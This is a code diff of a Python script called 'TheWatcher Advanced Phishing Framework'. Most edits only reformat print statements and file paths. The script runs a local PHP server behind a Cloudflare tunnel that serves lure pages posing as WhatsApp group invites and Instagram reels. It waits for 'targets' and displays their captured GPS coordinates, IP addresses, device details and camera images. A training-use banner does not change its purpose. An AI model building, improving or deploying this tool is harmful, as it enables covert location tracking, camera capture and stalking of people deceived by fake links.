@@ -7,9 +7,7 @@ import subprocess
 import threading
 import re
 import socket
-import platform
 
-# ==================== COLORS ====================
 class Colors:
     RED = '\033[91m'
     GREEN = '\033[92m'
@@ -26,7 +24,7 @@ def clear():
 
 def banner():
     clear()
-    print(f"""{Colors.RED}{Colors.BOLD}
+    print(Colors.RED + Colors.BOLD + """
       ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  
       ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
       ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
@@ -37,35 +35,44 @@ def banner():
         ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ 
                 ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     
                             ~EvilmaxSec | Tz~
-{Colors.END}
-{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}
-{Colors.RED}{Colors.BOLD}║         TheWatcher Advanced Phishing Framework               ║{Colors.END}
-{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}
-{Colors.GRAY}┌────────────────────────────────────────────────────────────────────────┐
-│  {Colors.WHITE}Author: {Colors.RED}EvilmaxSec{Colors.GRAY}                                                    │
-│  {Colors.WHITE}GitHub: {Colors.GRAY}https://github.com/EvilmaxSec{Colors.GRAY}                                 │
-│  {Colors.RED}⚠  AUTHORIZED TRAINING USE ONLY  ⚠{Colors.GRAY}                                    │
-└────────────────────────────────────────────────────────────────────────┘{Colors.END}
-""")
+""" + Colors.END)
+    print(Colors.RED + Colors.BOLD + """
+╔══════════════════════════════════════════════════════════════╗
+║         TheWatcher Advanced Phishing Framework               ║
+╚══════════════════════════════════════════════════════════════╝
+""" + Colors.END)
+    print(Colors.GRAY + "┌────────────────────────────────────────────────────────────────────────┐")
+    print("│  " + Colors.WHITE + "Author: " + Colors.RED + "EvilmaxSec" + Colors.GRAY + "                                                    │")
+    print("│  " + Colors.WHITE + "GitHub: " + Colors.GRAY + "https://github.com/EvilmaxSec" + Colors.GRAY + "                                 │")
+    print("│  " + Colors.RED + "⚠  AUTHORIZED TRAINING USE ONLY  ⚠" + Colors.GRAY + "                                    │")
+    print("└────────────────────────────────────────────────────────────────────────┘" + Colors.END)
+    print("")
 
 def print_menu(title, options):
-    print(f"\n{Colors.CYAN}{Colors.BOLD}┌─────────────────────────────────────────────────┐{Colors.END}")
-    print(f"{Colors.CYAN}{Colors.BOLD}│          {title:<37}{Colors.CYAN}{Colors.BOLD}  │{Colors.END}")
-    print(f"{Colors.CYAN}{Colors.BOLD}├─────────────────────────────────────────────────┤{Colors.END}")
+    print("\n" + Colors.CYAN + Colors.BOLD + "┌─────────────────────────────────────────────────┐" + Colors.END)
+    print(Colors.CYAN + Colors.BOLD + "│          " + title.ljust(35) + Colors.CYAN + Colors.BOLD + "    │" + Colors.END)
+    print(Colors.CYAN + Colors.BOLD + "├─────────────────────────────────────────────────┤" + Colors.END)
     for key, value in options.items():
-        print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.END}  {Colors.RED}[{key}]{Colors.END} {Colors.WHITE}{value:<39}{Colors.CYAN}{Colors.BOLD}   │{Colors.END}")
-    print(f"{Colors.CYAN}{Colors.BOLD}└─────────────────────────────────────────────────┘{Colors.END}")
+        print(Colors.CYAN + Colors.BOLD + "│" + Colors.END + "  " + Colors.RED + "[" + key + "]" + Colors.END + " " + Colors.WHITE + value.ljust(39) + Colors.CYAN + Colors.BOLD + "   │" + Colors.END)
+    print(Colors.CYAN + Colors.BOLD + "└─────────────────────────────────────────────────┘" + Colors.END)
 
-def print_success(msg): print(f"  {Colors.GREEN}✓{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
-def print_error(msg): print(f"  {Colors.RED}✗{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
-def print_info(msg): print(f"  {Colors.BLUE}ℹ{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
-def print_warning(msg): print(f"  {Colors.YELLOW}⚠{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
+def print_success(msg): 
+    print("  " + Colors.GREEN + "✓" + Colors.END + " " + Colors.WHITE + msg + Colors.END)
+
+def print_error(msg): 
+    print("  " + Colors.RED + "✗" + Colors.END + " " + Colors.WHITE + msg + Colors.END)
+
+def print_info(msg): 
+    print("  " + Colors.BLUE + "ℹ" + Colors.END + " " + Colors.WHITE + msg + Colors.END)
+
+def print_warning(msg): 
+    print("  " + Colors.YELLOW + "⚠" + Colors.END + " " + Colors.WHITE + msg + Colors.END)
 
 def get_input(prompt, default=""):
     if default:
-        val = input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}{Colors.GRAY} [{default}]:{Colors.END} ")
+        val = input("  " + Colors.RED + "➜" + Colors.END + " " + Colors.WHITE + prompt + Colors.GRAY + " [" + default + "]:" + Colors.END + " ")
         return val if val else default
-    return input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}:{Colors.END} ")
+    return input("  " + Colors.RED + "➜" + Colors.END + " " + Colors.WHITE + prompt + ":" + Colors.END + " ")
 
 def get_number(prompt, min_val, max_val):
     while True:
@@ -95,9 +102,9 @@ def check_command(cmd):
         return False
 
 def get_image_source(prompt_type):
-    print(f"\n  {Colors.CYAN}📸 {prompt_type}{Colors.END}")
-    print(f"  {Colors.GRAY}[1] Use image URL{Colors.END}")
-    print(f"  {Colors.GRAY}[2] Use local image file{Colors.END}")
+    print("\n  " + Colors.CYAN + "📸 " + prompt_type + Colors.END)
+    print("  " + Colors.GRAY + "[1] Use image URL" + Colors.END)
+    print("  " + Colors.GRAY + "[2] Use local image file" + Colors.END)
     
     choice = get_input("Choose option", "1")
     
@@ -114,9 +121,9 @@ def get_image_source(prompt_type):
                 return "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
 
 def get_video_source():
-    print(f"\n  {Colors.CYAN}🎬 Video Source{Colors.END}")
-    print(f"  {Colors.GRAY}[1] Use video URL{Colors.END}")
-    print(f"  {Colors.GRAY}[2] Use local video file{Colors.END}")
+    print("\n  " + Colors.CYAN + "🎬 Video Source" + Colors.END)
+    print("  " + Colors.GRAY + "[1] Use video URL" + Colors.END)
+    print("  " + Colors.GRAY + "[2] Use local video file" + Colors.END)
     
     choice = get_input("Choose option", "1")
     
@@ -152,26 +159,26 @@ def monitor_data(stop_event):
             for f in new_files:
                 if f.endswith('.json'):
                     try:
-                        with open(f'data/{f}', 'r') as file:
+                        with open(os.path.join('data', f), 'r') as file:
                             data = json.load(file)
                             if 'coordinates' in data and data['coordinates'].get('latitude'):
-                                print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                                print(f"{Colors.GREEN}{Colors.BOLD}📍 NEW LOCATION CAPTURED!{Colors.END}")
-                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                                print(f"  {Colors.YELLOW}Time:{Colors.END} {data.get('timestamp')}")
-                                print(f"  {Colors.YELLOW}IP:{Colors.END} {data.get('ip_address')}")
-                                print(f"  {Colors.YELLOW}GPS:{Colors.END} {data['coordinates']['latitude']}, {data['coordinates']['longitude']}")
-                                print(f"  {Colors.YELLOW}Device:{Colors.END} {data['device']['device']} | OS: {data['device']['os']}")
-                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
+                                print("\n" + Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
+                                print(Colors.GREEN + Colors.BOLD + "📍 NEW LOCATION CAPTURED!" + Colors.END)
+                                print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
+                                print("  " + Colors.YELLOW + "Time:" + Colors.END + " " + str(data.get('timestamp')))
+                                print("  " + Colors.YELLOW + "IP:" + Colors.END + " " + str(data.get('ip_address')))
+                                print("  " + Colors.YELLOW + "GPS:" + Colors.END + " " + str(data['coordinates']['latitude']) + ", " + str(data['coordinates']['longitude']))
+                                print("  " + Colors.YELLOW + "Device:" + Colors.END + " " + str(data['device']['device']) + " | OS: " + str(data['device']['os']))
+                                print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END + "\n")
                     except:
                         pass
                 elif f.endswith('.jpg'):
-                    size = os.path.getsize(f'data/{f}') // 1024
-                    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                    print(f"{Colors.GREEN}{Colors.BOLD}📸 NEW CAMERA IMAGE!{Colors.END}")
-                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                    print(f"  {Colors.YELLOW}File:{Colors.END} {f} ({size}KB)")
-                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
+                    size = os.path.getsize(os.path.join('data', f)) // 1024
+                    print("\n" + Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
+                    print(Colors.GREEN + Colors.BOLD + "📸 NEW CAMERA IMAGE!" + Colors.END)
+                    print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
+                    print("  " + Colors.YELLOW + "File:" + Colors.END + " " + f + " (" + str(size) + "KB)")
+                    print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END + "\n")
             processed = current
 
 class TheWatcher:
@@ -189,7 +196,7 @@ class TheWatcher:
         print_info(f"Starting PHP server on port {port}...")
         
         if not check_command("php"):
-            print_error("PHP not installed. Run: pkg install php (Termux) or sudo apt install php (Linux)")
+            print_error("PHP not installed")
             sys.exit(1)
         
         self.stop_monitor.clear()
@@ -219,19 +226,19 @@ class TheWatcher:
         url = cf.start(port)
         local_ip = get_local_ip()
         
-        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
-        print(f"{Colors.CYAN}{Colors.BOLD}🌐 SHAREABLE LINKS{Colors.END}")
-        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
+        print("\n" + Colors.CYAN + Colors.BOLD + "="*60 + Colors.END)
+        print(Colors.CYAN + Colors.BOLD + "🌐 SHAREABLE LINKS" + Colors.END)
+        print(Colors.CYAN + Colors.BOLD + "="*60 + Colors.END)
         if url:
             print_success(f"Cloudflare: {Colors.YELLOW}{url}{Colors.END}")
         print_success(f"Local: http://localhost:{port}")
         print_success(f"Network: http://{local_ip}:{port}")
         
-        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════════════════╗{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║     🚀 TheWatcher Active!                            ║{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║     📡 Waiting for targets...                       ║{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║     🔴 Press Ctrl+C to stop                         ║{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}╚══════════════════════════════════════════════════════╝{Colors.END}\n")
+        print("\n" + Colors.GREEN + Colors.BOLD + "╔══════════════════════════════════════════════════════╗" + Colors.END)
+        print(Colors.GREEN + Colors.BOLD + "║     🚀 TheWatcher Active!                            ║" + Colors.END)
+        print(Colors.GREEN + Colors.BOLD + "║     📡 Waiting for targets...                       ║" + Colors.END)
+        print(Colors.GREEN + Colors.BOLD + "║     🔴 Press Ctrl+C to stop                         ║" + Colors.END)
+        print(Colors.GREEN + Colors.BOLD + "╚══════════════════════════════════════════════════════╝" + Colors.END + "\n")
         
         try:
             while True:
@@ -244,8 +251,8 @@ class TheWatcher:
             cf.stop()
     
     def location_menu(self):
-        print(f"\n{Colors.BLUE}{Colors.BOLD}📍 LOCATION TRACKING{Colors.END}")
-        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
+        print("\n" + Colors.BLUE + Colors.BOLD + "📍 LOCATION TRACKING" + Colors.END)
+        print(Colors.GRAY + "─"*50 + Colors.END)
         
         print_menu("SELECT TEMPLATE", {
             "1": "WhatsApp Group Invite",
@@ -289,8 +296,8 @@ class TheWatcher:
             self.run_server(port, html)
     
     def camera_menu(self):
-        print(f"\n{Colors.BLUE}{Colors.BOLD}📸 CAMERA ACCESS{Colors.END}")
-        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
+        print("\n" + Colors.BLUE + Colors.BOLD + "📸 CAMERA ACCESS" + Colors.END)
+        print(Colors.GRAY + "─"*50 + Colors.END)
         
         print_menu("SELECT TEMPLATE", {
             "1": "Instagram Reel",
@@ -326,8 +333,8 @@ class TheWatcher:
             self.run_server(port, html)
     
     def view_data(self):
-        print(f"\n{Colors.BLUE}{Colors.BOLD}📊 COLLECTED DATA{Colors.END}")
-        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
+        print("\n" + Colors.BLUE + Colors.BOLD + "📊 COLLECTED DATA" + Colors.END)
+        print(Colors.GRAY + "─"*50 + Colors.END)
         
         if not os.path.exists('data') or not os.listdir('data'):
             print_warning("No data yet")
@@ -337,18 +344,18 @@ class TheWatcher:
         for f in os.listdir('data'):
             if f.endswith('.json'):
                 try:
-                    with open(f'data/{f}', 'r') as file:
+                    with open(os.path.join('data', f), 'r') as file:
                         data = json.load(file)
-                        print(f"\n  {Colors.GREEN}📄 {f}{Colors.END}")
-                        print(f"     {Colors.YELLOW}Time:{Colors.END} {data.get('timestamp')}")
-                        print(f"     {Colors.YELLOW}IP:{Colors.END} {data.get('ip_address')}")
+                        print("\n  " + Colors.GREEN + "📄 " + f + Colors.END)
+                        print("     " + Colors.YELLOW + "Time:" + Colors.END + " " + str(data.get('timestamp')))
+                        print("     " + Colors.YELLOW + "IP:" + Colors.END + " " + str(data.get('ip_address')))
                         if 'coordinates' in data:
-                            print(f"     {Colors.YELLOW}GPS:{Colors.END} {data['coordinates'].get('latitude')}, {data['coordinates'].get('longitude')}")
+                            print("     " + Colors.YELLOW + "GPS:" + Colors.END + " " + str(data['coordinates'].get('latitude')) + ", " + str(data['coordinates'].get('longitude')))
                 except:
                     pass
             elif f.endswith('.jpg'):
-                size = os.path.getsize(f'data/{f}') // 1024
-                print(f"\n  {Colors.GREEN}📸 {f}{Colors.END} ({size}KB)")
+                size = os.path.getsize(os.path.join('data', f)) // 1024
+                print("\n  " + Colors.GREEN + "📸 " + f + Colors.END + " (" + str(size) + "KB)")
         
         input("\n  Press Enter...")
     
